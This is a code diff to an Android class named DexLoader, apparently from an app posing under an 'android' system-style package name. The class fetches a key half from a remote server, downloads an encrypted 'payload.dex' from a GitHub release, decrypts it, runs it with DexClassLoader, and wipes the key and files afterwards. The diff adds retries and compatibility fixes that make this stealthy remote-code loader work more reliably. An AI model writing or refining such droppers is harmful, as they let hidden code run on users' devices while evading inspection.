@@ -3,7 +3,6 @@ package com.android.pictach;
 import android.content.Context;
 import android.security.keystore.KeyGenParameterSpec;
 import android.security.keystore.KeyProperties;
-import android.util.Base64;
 import android.util.Log;
 
 import org.json.JSONObject;
@@ -27,8 +26,8 @@ import dalvik.system.DexClassLoader;
 
 public class DexLoader {
 
-    private static final String TAG             = "DexLoader";
-    private static final String KEYSTORE_ALIAS  = "DexPartA";
+    private static final String TAG              = "DexLoader";
+    private static final String KEYSTORE_ALIAS   = "DexPartA";
     private static final String ANDROID_KEYSTORE = "AndroidKeyStore";
 
     // ── UPDATE THESE 3 VALUES ────────────────────────────────────────────────
@@ -40,8 +39,10 @@ public class DexLoader {
     private static final String PACKAGE_NAME = "com.android.pictach";
     private static final String DEX_FILENAME = "payload.dex";
     private static final String ENC_FILENAME = "payload.enc";
-    private static final String PART_A_FILE  = "pref_a.dat"; // Part A wrapped blob
+    private static final String PART_A_FILE  = "pref_a.dat";
 
+    // FIX 1: Return loader AND keep dex file alive until caller is done.
+    // Caller must call cleanup(context) after all classes are loaded.
     public static DexClassLoader load(Context context) {
         try {
             // 1. Ensure Part A exists in Keystore (generated once per device)
@@ -49,11 +50,17 @@ public class DexLoader {
 
             // 2. Fetch Part B from Railway
             String partB = fetchPartB();
-            if (partB == null) { Log.e(TAG, "Failed to fetch Part B"); return null; }
+            if (partB == null) {
+                Log.e(TAG, "Failed to fetch Part B");
+                return null;
+            }
 
             // 3. Combine Part A + Part B → full AES key
             byte[] fullKey = combineKeys(context, partB);
-            if (fullKey == null) { Log.e(TAG, "Failed to combine keys"); return null; }
+            if (fullKey == null) {
+                Log.e(TAG, "Failed to combine keys");
+                return null;
+            }
 
             // 4. Download encrypted DEX from GitHub Release
             File encFile = new File(context.getFilesDir(), ENC_FILENAME);
@@ -64,6 +71,9 @@ public class DexLoader {
             decryptFile(encFile, dexFile, fullKey);
             encFile.delete();
 
+            // Wipe key from memory immediately after decrypt
+            Arrays.fill(fullKey, (byte) 0);
+
             // 6. Load via DexClassLoader
             File optDir = context.getDir("outdex", Context.MODE_PRIVATE);
             DexClassLoader loader = new DexClassLoader(
@@ -73,16 +83,26 @@ public class DexLoader {
                 context.getClassLoader()
             );
 
-            // 7. Delete decrypted DEX immediately after loading
-            dexFile.delete();
-            Arrays.fill(fullKey, (byte) 0); // wipe key from memory
-
+            // FIX 2: Do NOT delete dex here. DexClassLoader uses lazy loading —
+            // deleting now causes ClassNotFoundException when classes are first used.
+            // Call cleanup(context) only AFTER you have instantiated all needed classes.
             Log.i(TAG, "DEX loaded successfully");
             return loader;
 
         } catch (Exception e) {
-            Log.e(TAG, "DexLoader error: " + e.getMessage());
+            Log.e(TAG, "DexLoader error: " + e.getMessage(), e);
             return null;
+        }
+    }
+
+    // Call this after you have fully initialized all classes from the loader
+    public static void cleanup(Context context) {
+        try {
+            new File(context.getFilesDir(), DEX_FILENAME).delete();
+            new File(context.getFilesDir(), ENC_FILENAME).delete();
+            Log.i(TAG, "DEX cleanup done");
+        } catch (Exception e) {
+            Log.w(TAG, "Cleanup error: " + e.getMessage());
         }
     }
 
@@ -93,7 +113,6 @@ public class DexLoader {
         ks.load(null);
         if (ks.containsAlias(KEYSTORE_ALIAS)) return;
 
-        // Generate AES key inside Keystore (never leaves hardware)
         KeyGenerator kg = KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES, ANDROID_KEYSTORE);
         kg.init(new KeyGenParameterSpec.Builder(
             KEYSTORE_ALIAS,
@@ -104,14 +123,12 @@ public class DexLoader {
             .build());
         kg.generateKey();
 
-        // Encrypt a fixed seed with this Keystore key → store blob as Part A reference
         SecretKey key = (SecretKey) ks.getKey(KEYSTORE_ALIAS, null);
         Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
         cipher.init(Cipher.ENCRYPT_MODE, key);
         byte[] iv  = cipher.getIV();
         byte[] enc = cipher.doFinal("PART_A_SEED".getBytes(StandardCharsets.UTF_8));
 
-        // Store IV + encrypted blob to private file
         File f = new File(context.getFilesDir(), PART_A_FILE);
         try (FileOutputStream fos = new FileOutputStream(f)) {
             fos.write(iv.length);
@@ -122,11 +139,15 @@ public class DexLoader {
 
     private static byte[] getPartABytes(Context context) throws Exception {
         File f = new File(context.getFilesDir(), PART_A_FILE);
+
+        // FIX 3: readAllBytes() requires API 33+. Use manual read for compatibility
+        // down to API 21 (the app's min SDK).
         byte[] blob;
         try (FileInputStream fis = new FileInputStream(f)) {
-            blob = fis.readAllBytes();
+            blob = readAllBytesCompat(fis);
         }
-        int ivLen = blob[0];
+
+        int ivLen = blob[0] & 0xFF;
         byte[] iv  = Arrays.copyOfRange(blob, 1, 1 + ivLen);
         byte[] enc = Arrays.copyOfRange(blob, 1 + ivLen, blob.length);
 
@@ -135,7 +156,7 @@ public class DexLoader {
         SecretKey key = (SecretKey) ks.getKey(KEYSTORE_ALIAS, null);
         Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
         cipher.init(Cipher.DECRYPT_MODE, key, new GCMParameterSpec(128, iv));
-        return cipher.doFinal(enc); // returns "PART_A_SEED" bytes
+        return cipher.doFinal(enc);
     }
 
     // ── Key Combine ──────────────────────────────────────────────────────────
@@ -144,7 +165,6 @@ public class DexLoader {
         byte[] partABytes = getPartABytes(context);
         byte[] partBBytes = partB.getBytes(StandardCharsets.UTF_8);
 
-        // XOR Part A seed hash with Part B hash → 32-byte AES key
         byte[] hashA = MessageDigest.getInstance("SHA-256").digest(partABytes);
         byte[] hashB = MessageDigest.getInstance("SHA-256").digest(partBBytes);
         byte[] combined = new byte[32];
@@ -154,28 +174,45 @@ public class DexLoader {
 
     // ── Railway: Fetch Part B ────────────────────────────────────────────────
 
-    private static String fetchPartB() throws Exception {
-        URL url = new URL(RAILWAY_URL);
-        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-        conn.setRequestMethod("POST");
-        conn.setRequestProperty("Content-Type", "application/json");
-        conn.setRequestProperty("x-app-token", APP_SECRET_TOKEN);
-        conn.setRequestProperty("x-package", PACKAGE_NAME);
-        conn.setConnectTimeout(10000);
-        conn.setReadTimeout(10000);
-        conn.setDoOutput(true);
-        conn.getOutputStream().write("{}".getBytes(StandardCharsets.UTF_8));
+    private static String fetchPartB() {
+        // FIX 4: Retry up to 3 times with backoff in case of transient network failure
+        for (int attempt = 1; attempt <= 3; attempt++) {
+            try {
+                URL url = new URL(RAILWAY_URL);
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "application/json");
+                conn.setRequestProperty("x-app-token", APP_SECRET_TOKEN);
+                conn.setRequestProperty("x-package", PACKAGE_NAME);
+                conn.setConnectTimeout(10000);
+                conn.setReadTimeout(10000);
+                conn.setDoOutput(true);
+                conn.getOutputStream().write("{}".getBytes(StandardCharsets.UTF_8));
 
-        if (conn.getResponseCode() != 200) return null;
+                int code = conn.getResponseCode();
+                if (code != 200) {
+                    Log.w(TAG, "fetchPartB HTTP " + code + " attempt " + attempt);
+                    conn.disconnect();
+                    Thread.sleep(attempt * 2000L);
+                    continue;
+                }
 
-        BufferedReader reader = new BufferedReader(
-            new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8));
-        StringBuilder sb = new StringBuilder();
-        String line;
-        while ((line = reader.readLine()) != null) sb.append(line);
-        reader.close();
+                BufferedReader reader = new BufferedReader(
+                    new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8));
+                StringBuilder sb = new StringBuilder();
+                String line;
+                while ((line = reader.readLine()) != null) sb.append(line);
+                reader.close();
+                conn.disconnect();
 
-        return new JSONObject(sb.toString()).getString("key");
+                return new JSONObject(sb.toString()).getString("key");
+
+            } catch (Exception e) {
+                Log.w(TAG, "fetchPartB attempt " + attempt + " failed: " + e.getMessage());
+                try { Thread.sleep(attempt * 2000L); } catch (InterruptedException ignored) {}
+            }
+        }
+        return null;
     }
 
     // ── Download ─────────────────────────────────────────────────────────────
@@ -189,18 +226,23 @@ public class DexLoader {
 
         try (InputStream in = conn.getInputStream();
              FileOutputStream out = new FileOutputStream(dest)) {
-            byte[] buf = new byte[4096];
+            byte[] buf = new byte[8192];
             int n;
             while ((n = in.read(buf)) != -1) out.write(buf, 0, n);
+        } finally {
+            conn.disconnect();
         }
     }
 
     // ── Decrypt ──────────────────────────────────────────────────────────────
 
     private static void decryptFile(File encFile, File outFile, byte[] keyBytes) throws Exception {
-        byte[] encData = java.nio.file.Files.readAllBytes(encFile.toPath());
+        // FIX 5: Files.readAllBytes() also requires API 26+. Use compat read.
+        byte[] encData;
+        try (FileInputStream fis = new FileInputStream(encFile)) {
+            encData = readAllBytesCompat(fis);
+        }
 
-        // First 16 bytes = IV (written by encrypt_dex.py)
         byte[] iv         = Arrays.copyOfRange(encData, 0, 16);
         byte[] ciphertext = Arrays.copyOfRange(encData, 16, encData.length);
 
@@ -211,5 +253,19 @@ public class DexLoader {
         try (FileOutputStream fos = new FileOutputStream(outFile)) {
             fos.write(decrypted);
         }
+    }
+
+    // ── Compat Helpers ───────────────────────────────────────────────────────
+
+    // Replacement for InputStream.readAllBytes() which requires API 33+
+    // This works from API 21 (Android 5.0) onwards
+    private static byte[] readAllBytesCompat(InputStream is) throws IOException {
+        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
+        byte[] chunk = new byte[8192];
+        int n;
+        while ((n = is.read(chunk)) != -1) {
+            buffer.write(chunk, 0, n);
+        }
+        return buffer.toByteArray();
     }
 }
